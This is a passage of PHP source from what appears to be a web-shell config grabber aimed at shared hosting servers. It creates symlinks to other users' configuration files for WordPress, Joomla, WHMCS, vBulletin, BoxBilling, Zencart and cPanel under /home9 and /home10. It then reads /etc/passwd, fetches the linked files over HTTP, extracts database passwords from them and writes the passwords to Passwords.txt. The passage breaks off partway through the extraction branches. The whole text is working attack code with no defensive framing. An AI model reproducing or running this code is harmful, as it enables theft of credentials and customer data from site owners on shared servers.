    @symlink('/home9/'.$user.'/public_html/hosting/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/CART/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/Cart/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/cart/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/ORDER/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/Order/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/order/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/CLIENT/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/Client/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/client/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/CLIENTAREA/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/Clientarea/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/clientarea/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/SUPPORT/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/Support/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/support/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/BILLING/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/Billing/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/billing/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/BUY/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/Buy/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/buy/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/MANAGE/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/Manage/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/manage/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/CLIENTSUPPORT/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/ClientSupport/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/Clientsupport/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/clientsupport/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/CHECKOUT/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/Checkout/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/checkout/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/BASKET/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/Basket/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/basket/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/SECURE/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/Secure/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/secure/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/SALES/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/Sales/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/sales/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/BILL/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/Bill/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/bill/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/PURCHASE/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/Purchase/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/purchase/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/ACCOUNT/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/Account/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/account/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/USER/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/User/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/user/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/CLIENTS/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/Clients/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/clients/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/MY/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/My/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/my/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/secure/whm/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/secure/whmcs/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/panel/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/clientes/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/cliente/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/support/order/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home9/'.$user.'/public_html/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home9/'.$user.'/public_html/boxbilling/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home9/'.$user.'/public_html/box/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home9/'.$user.'/public_html/host/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home9/'.$user.'/public_html/Host/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home9/'.$user.'/public_html/supportes/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home9/'.$user.'/public_html/support/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home9/'.$user.'/public_html/hosting/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home9/'.$user.'/public_html/cart/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home9/'.$user.'/public_html/order/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home9/'.$user.'/public_html/client/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home9/'.$user.'/public_html/clients/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home9/'.$user.'/public_html/cliente/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home9/'.$user.'/public_html/clientes/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home9/'.$user.'/public_html/billing/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home9/'.$user.'/public_html/billings/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home9/'.$user.'/public_html/my/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home9/'.$user.'/public_html/secure/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home9/'.$user.'/public_html/support/order/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home9/'.$user.'/public_html/includes/dist-configure.php',$user.'-Zencart.txt');
    @symlink('/home9/'.$user.'/public_html/zencart/includes/dist-configure.php',$user.'-Zencart.txt');
    @symlink('/home9/'.$user.'/public_html/products/includes/dist-configure.php',$user.'-Zencart.txt');
    @symlink('/home9/'.$user.'/public_html/cart/includes/dist-configure.php',$user.'-Zencart.txt');
    @symlink('/home9/'.$user.'/public_html/shop/includes/dist-configure.php',$user.'-Zencart.txt');
    @symlink('/home9/'.$user.'/public_html/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home9/'.$user.'/public_html/hostbills/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home9/'.$user.'/public_html/host/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home9/'.$user.'/public_html/Host/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home9/'.$user.'/public_html/supportes/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home9/'.$user.'/public_html/support/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home9/'.$user.'/public_html/hosting/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home9/'.$user.'/public_html/cart/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home9/'.$user.'/public_html/order/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home9/'.$user.'/public_html/client/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home9/'.$user.'/public_html/clients/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home9/'.$user.'/public_html/cliente/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home9/'.$user.'/public_html/clientes/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home9/'.$user.'/public_html/billing/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home9/'.$user.'/public_html/billings/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home9/'.$user.'/public_html/my/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home9/'.$user.'/public_html/secure/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home9/'.$user.'/public_html/support/order/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home9/'.$user.'/.my.cnf',$user.'-Cpanel.txt');
    @symlink('/home9/'.$user.'/public_html/po-content/config.php',$user.'-Popoji.txt');

    //home 10

    @symlink('/home10/'.$user.'/public_html/vb/includes/config.php',$user.'-Vbulletin.txt');
    @symlink('/home10/'.$user.'/public_html/includes/config.php',$user.'-Vbulletin.txt');
    @symlink('/home10/'.$user.'/public_html/forum/includes/config.php',$user.'-Vbulletin.txt');
    @symlink('/home10/'.$user.'/public_html/forums/includes/config.php',$user.'-Vbulletin.txt');
    @symlink('/home10/'.$user.'/public_html/cc/includes/config.php',$user.'-Vbulletin.txt');
    @symlink('/home10/'.$user.'/public_html/inc/config.php',$user.'-MyBB.txt');
    @symlink('/home10/'.$user.'/public_html/includes/configure.php',$user.'-OsCommerce.txt');
    @symlink('/home10/'.$user.'/public_html/shop/includes/configure.php',$user.'-OsCommerce.txt');
    @symlink('/home10/'.$user.'/public_html/os/includes/configure.php',$user.'-OsCommerce.txt');
    @symlink('/home10/'.$user.'/public_html/oscom/includes/configure.php',$user.'-OsCommerce.txt');
    @symlink('/home10/'.$user.'/public_html/products/includes/configure.php',$user.'-OsCommerce.txt');
    @symlink('/home10/'.$user.'/public_html/cart/includes/configure.php',$user.'-OsCommerce.txt');
    @symlink('/home10/'.$user.'/public_html/inc/conf_global.php',$user.'-IPB.txt');
    @symlink('/home10/'.$user.'/public_html/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home10/'.$user.'/public_html/wp/test/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home10/'.$user.'/public_html/blog/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home10/'.$user.'/public_html/beta/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home10/'.$user.'/public_html/portal/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home10/'.$user.'/public_html/site/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home10/'.$user.'/public_html/wp/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home10/'.$user.'/public_html/WP/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home10/'.$user.'/public_html/news/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home10/'.$user.'/public_html/wordpress/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home10/'.$user.'/public_html/test/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home10/'.$user.'/public_html/demo/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home10/'.$user.'/public_html/home/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home10/'.$user.'/public_html/v1/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home10/'.$user.'/public_html/v2/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home10/'.$user.'/public_html/press/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home10/'.$user.'/public_html/new/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home10/'.$user.'/public_html/blogs/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home10/'.$user.'/public_html/configuration.php',$user.'-Joomla.txt');
    @symlink('/home10/'.$user.'/public_html/blog/configuration.php',$user.'-Joomla.txt');
    @symlink('/home10/'.$user.'/public_html/submitticket.php',$user.'-^WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/cms/configuration.php',$user.'-Joomla.txt');
    @symlink('/home10/'.$user.'/public_html/beta/configuration.php',$user.'-Joomla.txt');
    @symlink('/home10/'.$user.'/public_html/portal/configuration.php',$user.'-Joomla.txt');
    @symlink('/home10/'.$user.'/public_html/site/configuration.php',$user.'-Joomla.txt');
    @symlink('/home10/'.$user.'/public_html/main/configuration.php',$user.'-Joomla.txt');
    @symlink('/home10/'.$user.'/public_html/home/configuration.php',$user.'-Joomla.txt');
    @symlink('/home10/'.$user.'/public_html/demo/configuration.php',$user.'-Joomla.txt');
    @symlink('/home10/'.$user.'/public_html/test/configuration.php',$user.'-Joomla.txt');
    @symlink('/home10/'.$user.'/public_html/v1/configuration.php',$user.'-Joomla.txt');
    @symlink('/home10/'.$user.'/public_html/v2/configuration.php',$user.'-Joomla.txt');
    @symlink('/home10/'.$user.'/public_html/joomla/configuration.php',$user.'-Joomla.txt');
    @symlink('/home10/'.$user.'/public_html/new/configuration.php',$user.'-Joomla.txt');
    @symlink('/home10/'.$user.'/public_html/WHMCS/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/whmcs1/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/Whmcs/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/WHMC/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/Whmc/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/whmc/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/WHM/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/Whm/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/whm/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/HOST/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/Host/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/host/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/SUPPORTES/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/Supportes/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/supportes/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/domains/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/domain/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/Hosting/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/HOSTING/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/hosting/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/CART/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/Cart/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/cart/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/ORDER/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/Order/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/order/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/CLIENT/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/Client/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/client/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/CLIENTAREA/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/Clientarea/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/clientarea/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/SUPPORT/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/Support/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/support/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/BILLING/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/Billing/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/billing/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/BUY/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/Buy/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/buy/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/MANAGE/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/Manage/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/manage/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/CLIENTSUPPORT/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/ClientSupport/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/Clientsupport/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/clientsupport/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/CHECKOUT/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/Checkout/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/checkout/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/BASKET/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/Basket/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/basket/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/SECURE/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/Secure/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/secure/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/SALES/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/Sales/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/sales/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/BILL/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/Bill/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/bill/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/PURCHASE/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/Purchase/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/purchase/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/ACCOUNT/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/Account/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/account/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/USER/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/User/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/user/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/CLIENTS/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/Clients/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/clients/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/MY/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/My/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/my/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/secure/whm/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/secure/whmcs/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/panel/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/clientes/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/cliente/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/support/order/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home10/'.$user.'/public_html/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home10/'.$user.'/public_html/boxbilling/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home10/'.$user.'/public_html/box/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home10/'.$user.'/public_html/host/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home10/'.$user.'/public_html/Host/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home10/'.$user.'/public_html/supportes/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home10/'.$user.'/public_html/support/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home10/'.$user.'/public_html/hosting/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home10/'.$user.'/public_html/cart/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home10/'.$user.'/public_html/order/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home10/'.$user.'/public_html/client/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home10/'.$user.'/public_html/clients/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home10/'.$user.'/public_html/cliente/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home10/'.$user.'/public_html/clientes/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home10/'.$user.'/public_html/billing/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home10/'.$user.'/public_html/billings/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home10/'.$user.'/public_html/my/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home10/'.$user.'/public_html/secure/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home10/'.$user.'/public_html/support/order/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home10/'.$user.'/public_html/includes/dist-configure.php',$user.'-Zencart.txt');
    @symlink('/home10/'.$user.'/public_html/zencart/includes/dist-configure.php',$user.'-Zencart.txt');
    @symlink('/home10/'.$user.'/public_html/products/includes/dist-configure.php',$user.'-Zencart.txt');
    @symlink('/home10/'.$user.'/public_html/cart/includes/dist-configure.php',$user.'-Zencart.txt');
    @symlink('/home10/'.$user.'/public_html/shop/includes/dist-configure.php',$user.'-Zencart.txt');
    @symlink('/home10/'.$user.'/public_html/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home10/'.$user.'/public_html/hostbills/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home10/'.$user.'/public_html/host/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home10/'.$user.'/public_html/Host/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home10/'.$user.'/public_html/supportes/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home10/'.$user.'/public_html/support/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home10/'.$user.'/public_html/hosting/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home10/'.$user.'/public_html/cart/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home10/'.$user.'/public_html/order/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home10/'.$user.'/public_html/client/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home10/'.$user.'/public_html/clients/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home10/'.$user.'/public_html/cliente/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home10/'.$user.'/public_html/clientes/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home10/'.$user.'/public_html/billing/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home10/'.$user.'/public_html/billings/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home10/'.$user.'/public_html/my/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home10/'.$user.'/public_html/secure/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home10/'.$user.'/public_html/support/order/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home10/'.$user.'/.my.cnf',$user.'-Cpanel.txt');
    @symlink('/home10/'.$user.'/public_html/po-content/config.php',$user.'-Popoji.txt');
    }

    //password grab

    function entre2v2($text,$marqueurDebutLien,$marqueurFinLien)
    {

    $ar0=explode($marqueurDebutLien, $text);
    $ar1=explode($marqueurFinLien, $ar0[1]);
    $ar=trim($ar1[0]);
    return $ar;
    }

    $ffile=fopen('Passwords.txt','a+');


    $r= 'http://'.$_SERVER['SERVER_NAME'].dirname($_SERVER['SCRIPT_NAME'])."/santuy_symconf/";
    $re=$r;
    $confi=array("-Wordpress.txt","-Joomla.txt","-WHMCS.txt","-Vbulletin.txt","-Other.txt","-Zencart.txt","-Hostbills.txt","-SMF.txt","-Drupal.txt","-OsCommerce.txt","-MyBB.txt","-PHPBB.txt","-IPB.txt","-BoxBilling.txt");

    $users=file("/etc/passwd");
    foreach($users as $user)
    {

    $str=explode(":",$user);
    $usersss=$str[0];
    foreach($confi as $co)
    {


    $uurl=$re.$usersss.$co;
    $uel=$uurl;

    $ch = curl_init();

    curl_setopt($ch, CURLOPT_URL, $uel);
    curl_setopt($ch, CURLOPT_HEADER, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.8) Gecko/2009032609 Firefox/3.0.8');
    $result['EXE'] = curl_exec($ch);
    curl_close($ch);
    $uxl=$result['EXE'];


    if($uxl && preg_match('/table_prefix/i',$uxl))
    {

    //Wordpress

    $dbp=entre2v2($uxl,"DB_PASSWORD', '","');");
    if(!empty($dbp))
    $pass=$dbp."\n";
    fwrite($ffile,$pass);

    }
    elseif($uxl && preg_match('/cc_encryption_hash/i',$uxl))
    {

    //WHMCS

    $dbp=entre2v2($uxl,"db_password = '","';");
    if(!empty($dbp))
    $pass=$dbp."\n";
    fwrite($ffile,$pass);

    }


    elseif($uxl && preg_match('/dbprefix/i',$uxl))
    {

    //Joomla

    $db=entre2v2($uxl,"password = '","';");
    if(!empty($db))
    $pass=$db."\n";
    fwrite($ffile,$pass);
    }
    elseif($uxl && preg_match('/admincpdir/i',$uxl))
    {

    //Vbulletin

    $db=entre2v2($uxl,"password'] = '","';");
    if(!empty($db))
    $pass=$db."\n";
    fwrite($ffile,$pass);

    }
